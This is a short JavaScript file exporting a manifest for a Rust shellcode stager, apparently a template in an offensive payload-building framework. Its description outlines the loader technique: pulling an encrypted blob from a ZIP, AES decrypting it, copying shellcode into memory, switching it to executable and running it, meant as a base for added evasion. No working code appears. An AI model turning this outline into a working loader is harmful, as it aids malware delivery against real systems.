const manifest = {
  "title": "Rust PE Stager \u2014 Direct Exec (Baseline)",
  "file_type": "exe",
  "payload_type": "Rust",
  "author": "ph3eds",
  "description": "Baseline stager with no evasion.  Finds THORNPLD blob in a ZIP, decrypts it with AES-256-CBC, allocates RW memory, copies the shellcode, hardens to RX, then calls it directly in the main thread.  No sacrificial process, no PPID spoofing.  Intended as the clean foundation onto which evasion layers are added.",
  "mitre": [],
  "references": [],
  "parameters": [],
  "cargo_deps": {
    "aes": "0.8",
    "cbc": "0.1",
    "windows": {
      "version": "0.58",
      "features": [
        "Win32_Foundation",
        "Win32_System_LibraryLoader"
      ]
    }
  }
}
export { manifest }
